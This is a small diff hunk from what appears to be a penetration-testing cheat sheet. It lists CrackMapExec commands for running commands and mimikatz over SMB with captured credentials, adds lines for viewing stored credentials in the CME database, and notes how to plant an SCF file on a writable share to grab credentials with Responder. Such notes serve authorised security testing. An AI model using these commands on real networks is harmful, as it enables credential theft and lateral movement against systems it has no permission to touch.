@@ -108,6 +108,9 @@ Crackmapexec
   cme smb 10.10.10.125 -u username -p password -x whoami (run CMD command, -X for Powershell)
   cme smb 10.10.10.125 -L (View all SMB Modules)
   cme smb 10.10.10.125 -u username -p password -M mimikatz (runs mimikatz on all hosts you have creds for)
+  cmedb (CME database)
+    proto smb
+    creds
   
 SCF (Shell Command Files)
   If you can write to a share you can create a SCF file which points an ICONfile to a local share to grab creds with responder.
